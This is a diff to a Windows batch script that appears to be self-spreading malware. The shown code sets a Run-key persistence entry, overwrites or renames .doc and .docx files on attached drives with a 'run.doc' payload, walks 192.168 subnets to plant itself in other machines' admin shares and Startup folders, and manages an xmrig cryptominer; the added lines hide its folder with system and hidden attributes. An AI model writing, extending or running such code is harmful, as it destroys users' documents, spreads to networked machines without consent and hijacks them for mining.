@@ -9,6 +9,11 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
 goto skip
 :next
 set daysofweek=Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday
@@ -76,12 +81,18 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -133,12 +144,18 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc)
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc)
@@ -190,12 +207,18 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -247,12 +270,18 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
 
 for /f %%x in ('net view \\192.168.%i%.%ii%') do pushd \\192.168.%i%.%ii%\%%x
 if exist A: (for /f %%x in ('dir A:\Users /b') do mkdir "A:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
@@ -313,12 +342,18 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -370,12 +405,18 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc)
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc)
@@ -427,12 +468,18 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -484,12 +531,18 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
 
 pushd \\192.168.%i%.%ii%\C$
 if exist A: (for /f %%x in ('dir A:\Users /b') do mkdir "A:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
@@ -550,12 +603,18 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -607,12 +666,18 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc)
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc)
@@ -664,12 +729,18 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -721,12 +792,18 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.00 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.01 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.02 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.03 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.04 goto next
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.05 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.06 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next
 
 if %ii% == 256 (goto next) else (set /a ii=ii+1)
 goto run
@@ -746,6 +823,8 @@ timeout 3
 goto run
 
 :download
+attrib -h -s -r "C:\ProgramData\PSU" /s /d
 taskkill /IM xmrig.exe /F
+timeout 0 >> nul
 del "C:\ProgramData\PSU\xmrig.exe"
 goto run
